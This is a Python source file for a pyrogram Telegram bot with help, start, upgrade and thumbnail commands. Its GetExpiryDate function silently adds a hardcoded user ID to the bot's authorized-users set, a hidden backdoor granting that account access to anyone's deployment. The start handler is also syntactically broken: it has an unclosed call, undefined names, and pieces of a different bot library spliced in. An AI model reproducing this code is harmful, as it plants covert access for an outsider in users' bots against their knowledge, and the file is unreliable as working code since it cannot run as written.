#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(Filters.private & Filters.command("start") & Filters.text)
async def start(bot,update):
    await bot.send_message(
        chat_id=update.chat.id,
            text = START_TEXT

    keyboard += [[InlineKeyboardButton(text="❓️Help❓️",url="http://t.me/{}?start=help".format(bot.username)),InlineKeyboardButton(text="🛡Creator🛡",url="t.me/KL35Palakaaran")]]
    keyboard += [[InlineKeyboardButton(text="❤️My Group❤️",url="t.me/KL35Cinemas"),InlineKeyboardButton(text="💛My Channel💛",url="t.me/KL35Cinemaz")]]
    keyboard += [[InlineKeyboardButton(text="📌 Support Group",url="t.me/InFoTelGroup")]]

    update.effective_message.reply_text(START_TEXT.format(escape_markdown(first_name), escape_markdown(bot.first_name)), 
                                         reply_markup=InlineKeyboardMarkup(keyboard), disable_web_page_preview=True, parse_mode=ParseMode.MARKDOWN)


@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["kl35thumb"]))
async def kl35thumb(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/kl35thumb")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.KL_35_THUMB_NAIL,
        reply_to_message_id=update.message_id
    )
